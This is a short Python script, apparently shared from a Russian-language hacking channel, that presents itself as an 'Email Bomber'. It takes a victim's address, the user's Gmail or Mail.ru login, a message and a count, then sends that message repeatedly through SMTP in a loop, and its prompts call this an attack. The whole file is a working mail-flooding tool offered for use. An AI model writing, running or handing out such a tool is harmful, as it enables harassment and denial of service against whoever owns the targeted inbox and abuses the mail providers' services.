import smtplib
import time
from sys import platform
from os import system

def clear():
	if platform == "linux" or platform == "linux2" or platform == "unix":
		system("clear")
	elif platform == "win32":
		system("cls")
	else:
		system("clear")

clear()
print (" _____                 _ _    ____                  _                ")
print ("| ____|_ __ ___   __ _(_) |  | __ )  ___  _ __ ___ | |__   ___ _ __  ")
print ("|  _| | '_ ` _ \ / _` | | |  |  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__| ")
print ("| |___| | | | | | (_| | | |  | |_) | (_) | | | | | | |_) |  __/ |    ")
print ("|_____|_| |_| |_|\__,_|_|_|  |____/ \___/|_| |_| |_|_.__/ \___|_|    ")
print ("")
print ("YouTube Channel: youtube.com/c/HZFYT")
print ("Telegram Channel: t.me/hzfnews")
print ("Vk: vk.com/hzforum1")
print ("")

try:
    bomb_email = input("Введите адрес электронной почты на чью почту вы хотите провести эту атаку: ")
    email = input("Введите свою gmail почту: ")
    password = input("Введите свой gmail пароль: ")
    message = input("Введите сообщение: ")
    counter = int(input("Сколько сообщений вы хотите отправить?: "))

    s_ = input('Выберите поставщика почты (Gmail / Mail.ru): ').lower()

    if s_ == "gmail":
        mail = smtplib.SMTP('smtp.gmail.com',587)
    elif s_ == "mail":
        mail = smtplib.SMTP('smtp.mail.ru',587)

    for x in range(0,counter):
        print("Количество отправленных сообщений: ", x+1)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()
except Exception as e:
    print("Если что-то не так, повторите попытку, указав правильные данные.")
